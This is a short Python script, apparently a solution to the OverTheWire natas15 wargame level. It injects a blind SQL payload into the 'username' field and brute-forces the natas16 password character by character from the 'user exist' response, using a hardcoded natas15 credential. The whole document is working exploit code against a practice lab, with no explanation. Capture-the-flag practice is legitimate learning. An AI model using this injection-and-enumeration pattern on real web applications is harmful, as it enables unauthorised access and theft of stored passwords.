import requests,re
from string import *
url = "http://natas15.natas.labs.overthewire.org/index.php"

username="natas15"
password="TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
chars=ascii_lowercase+ascii_uppercase+digits
pwd=""
ct=0
session = requests.Session()
pwd = ""
while(True):
    if ct == len(chars):
        print("password is ",pwd)
        exit(0)

    r=requests.post(url=url,data={"username":'natas16" AND BINARY password LIKE"'+pwd+chars[ct]+'%" #'},auth=(username,password))
    print("Tring [*] : ",pwd+chars[ct])
    if "user exist" in r.text:
        pwd+=chars[ct]
        ct=0
    else:
        ct+=1



